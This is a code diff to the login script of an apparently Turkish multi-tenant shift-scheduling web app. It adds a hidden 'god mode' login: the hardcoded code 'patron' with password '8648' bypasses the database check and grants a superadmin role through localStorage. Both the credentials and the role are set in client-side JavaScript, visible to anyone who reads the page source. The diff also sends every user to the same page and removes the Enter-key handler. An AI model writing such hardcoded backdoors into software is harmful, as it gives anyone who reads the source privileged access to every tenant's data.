@@ -271,6 +271,17 @@
 
             if(!kod || !sifre) return alert("Lütfen Kurum Kodunu ve Şifrenizi girin!");
 
+            // 🔥 SÜPER PATRON (GOD MODE) GİZLİ GİRİŞİ 🔥
+            if (kod === "patron" && sifre === "8648") {
+                localStorage.setItem('sm_current_tenant', 'patron_base'); // Geçici yönetim üssü
+                localStorage.setItem('sm_active_user', 'SİSTEM KURUCUSU');
+                localStorage.setItem('sm_current_kurum_adi', 'YÖNETİM MERKEZİ');
+                localStorage.setItem('sm_role', 'superadmin'); // Yetkiyi en tepeye aldık
+                window.location.href = "shiftmaster.html";
+                return;
+            }
+
+            // Normal Kullanıcı Girişi
             rtdb.ref('kurum_kayitlari/' + kod).once('value').then(snap => {
                 if(!snap.exists()) return alert("Hatalı Giriş! Böyle bir kurum kodu bulunamadı.");
 
@@ -283,7 +294,7 @@
                         localStorage.setItem('sm_active_user', kurumData.patronIsim.toUpperCase());
                         localStorage.setItem('sm_current_kurum_adi', kurumData.kurumAdi);
                         localStorage.setItem('sm_role', 'admin');
-                        window.location.href = (kod === "addh") ? "shiftmaster.html" : "saas-shift.html";
+                        window.location.href = "shiftmaster.html";
                     } else {
                         document.getElementById('verificationNotice').style.display = 'block';
                         auth.signOut();
@@ -296,8 +307,7 @@
                             localStorage.setItem('sm_active_user', altData.isim);
                             localStorage.setItem('sm_current_kurum_adi', kurumData.kurumAdi);
                             localStorage.setItem('sm_role', altData.rol || 'user');
-                            
-                            window.location.href = (kod === "addh") ? "shiftmaster.html" : "saas-shift.html";
+                            window.location.href = "shiftmaster.html";
                         } else {
                             alert("Şifreniz Hatalı! (Patron veya Personel kaydı eşleşmedi)");
                         }
@@ -305,8 +315,6 @@
                 });
             });
         }
-
-        document.getElementById('formGiris').addEventListener('keypress', function (e) { if (e.key === 'Enter') sihirliGirisYap(); });
     </script>
 </body>
 </html>
